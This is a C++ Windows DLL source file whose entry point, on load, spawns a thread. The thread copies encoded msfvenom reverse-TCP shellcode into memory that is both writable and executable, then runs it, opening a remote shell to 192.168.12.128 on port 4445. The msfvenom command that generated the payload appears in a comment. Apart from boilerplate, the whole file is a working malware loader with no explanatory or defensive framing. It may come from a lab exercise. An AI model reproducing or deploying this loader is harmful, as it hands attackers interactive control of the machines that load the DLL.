// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

DWORD WINAPI RunShellCode(LPVOID lpParameter) {
    LPVOID newMemory;
    BOOL writeMemory;
    HANDLE currentProcess = GetCurrentProcess();
    SIZE_T bytesWritten;

    //msfvenom -p windows/x64/shell_reverse_tcp -b '\x00\x0a\x0d' LHOST=192.168.12.128 LPORT=4445 -f c

    unsigned char shellcode[] =
        "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
        "\xff\xff\x48\xbb\x14\xfa\xb8\x9e\x5f\xab\xa4\x4f\x48\x31\x58"
        "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe8\xb2\x3b\x7a\xaf\x43"
        "\x64\x4f\x14\xfa\xf9\xcf\x1e\xfb\xf6\x1e\x42\xb2\x89\x4c\x3a"
        "\xe3\x2f\x1d\x74\xb2\x33\xcc\x47\xe3\x2f\x1d\x34\xb2\x33\xec"
        "\x0f\xe3\xab\xf8\x5e\xb0\xf5\xaf\x96\xe3\x95\x8f\xb8\xc6\xd9"
        "\xe2\x5d\x87\x84\x0e\xd5\x33\xb5\xdf\x5e\x6a\x46\xa2\x46\xbb"
        "\xe9\xd6\xd4\xf9\x84\xc4\x56\xc6\xf0\x9f\x8f\x20\x24\xc7\x14"
        "\xfa\xb8\xd6\xda\x6b\xd0\x28\x5c\xfb\x68\xce\xd4\xe3\xbc\x0b"
        "\x9f\xba\x98\xd7\x5e\x7b\x47\x19\x5c\x05\x71\xdf\xd4\x9f\x2c"
        "\x07\x15\x2c\xf5\xaf\x96\xe3\x95\x8f\xb8\xbb\x79\x57\x52\xea"
        "\xa5\x8e\x2c\x1a\xcd\x6f\x13\xa8\xe8\x6b\x1c\xbf\x81\x4f\x2a"
        "\x73\xfc\x0b\x9f\xba\x9c\xd7\x5e\x7b\xc2\x0e\x9f\xf6\xf0\xda"
        "\xd4\xeb\xb8\x06\x15\x2a\xf9\x15\x5b\x23\xec\x4e\xc4\xbb\xe0"
        "\xdf\x07\xf5\xfd\x15\x55\xa2\xf9\xc7\x1e\xf1\xec\xcc\xf8\xda"
        "\xf9\xcc\xa0\x4b\xfc\x0e\x4d\xa0\xf0\x15\x4d\x42\xf3\xb0\xeb"
        "\x05\xe5\xd7\xe1\xdc\xd7\x7d\x4b\xc9\x8a\x9e\x5f\xea\xf2\x06"
        "\x9d\x1c\xf0\x1f\xb3\x0b\xa5\x4f\x14\xb3\x31\x7b\x16\x17\xa6"
        "\x4f\x05\xa7\x78\x36\x53\x2b\xe5\x1b\x5d\x73\x5c\xd2\xd6\x5a"
        "\xe5\xf5\x58\x8d\x9e\x99\xa0\x7e\xe8\xc6\xfe\x92\xb9\x9f\x5f"
        "\xab\xfd\x0e\xae\xd3\x38\xf5\x5f\x54\x71\x1f\x44\xb7\x89\x57"
        "\x12\x9a\x64\x07\xeb\x3a\xf0\x17\x9d\xe3\x5b\x8f\x5c\x73\x79"
        "\xdf\xe5\x41\xab\x90\xf4\x05\x6d\xd6\xd6\x6c\xce\x5f\x55\xa2"
        "\xf4\x17\xbd\xe3\x2d\xb6\x55\x40\x21\x3b\x2b\xca\x5b\x9a\x5c"
        "\x7b\x7c\xde\x5d\xab\xa4\x06\xac\x99\xd5\xfa\x5f\xab\xa4\x4f"
        "\x14\xbb\xe8\xdf\x0f\xe3\x2d\xad\x43\xad\xef\xd3\x6e\x6b\xce"
        "\x42\x4d\xbb\xe8\x7c\xa3\xcd\x63\x0b\x30\xae\xb9\x9f\x17\x26"
        "\xe0\x6b\x0c\x3c\xb8\xf6\x17\x22\x42\x19\x44\xbb\xe8\xdf\x0f"
        "\xea\xf4\x06\xeb\x3a\xf9\xce\x16\x54\x6c\x02\x9d\x3b\xf4\x17"
        "\x9e\xea\x1e\x36\xd8\xc5\x3e\x61\x8a\xe3\x95\x9d\x5c\x05\x72"
        "\x15\x51\xea\x1e\x47\x93\xe7\xd8\x61\x8a\x10\x54\xfa\xb6\xac"
        "\xf9\x24\xf9\x3e\x19\xd2\xeb\x2f\xf0\x1d\x9b\x83\x98\x49\x68"
        "\xf0\x38\x65\xbf\xde\xa1\xf4\x53\xe9\xca\xf1\x35\xab\xfd\x0e"
        "\x9d\x20\x47\x4b\x5f\xab\xa4\x4f";
    newMemory = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (newMemory == NULL) {
        OutputDebugStringW(L"FAILED TO ALLOCATE MEMORY");
        return -1;
    }

    writeMemory = WriteProcessMemory(currentProcess, newMemory, (LPCVOID)&shellcode, sizeof shellcode, &bytesWritten);
    if (!writeMemory) {
        OutputDebugStringW(L"FAILED TO WRITE TO MEMORY");
        return -2;
    }

    ((void(*)())newMemory)();
    return 1;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    HANDLE threadHandle;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
        threadHandle = CreateThread(NULL, 0, RunShellCode, NULL, 0, NULL);
        if (!threadHandle) {
            break;
        }
        CloseHandle(threadHandle);
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

